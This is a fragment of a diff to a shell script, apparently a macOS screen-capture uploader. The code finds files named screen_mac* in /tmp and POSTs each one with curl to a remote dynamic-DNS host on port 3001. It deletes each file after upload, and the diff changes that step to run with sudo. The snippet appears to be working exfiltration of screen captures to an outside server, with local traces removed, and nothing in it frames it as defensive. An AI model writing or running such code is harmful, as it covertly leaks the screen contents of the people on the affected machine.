@@ -26,7 +26,7 @@ sudo killall curl || true
 find /tmp -name screen_mac* -type f -print | while read -r file ; do
   echo "uploading \$file"
   curl -X POST --form file=@\$file http://kk61676.ddns.net:3001/file || break
-  rm \$file
+  sudo rm \$file
 done
 EOM2
 
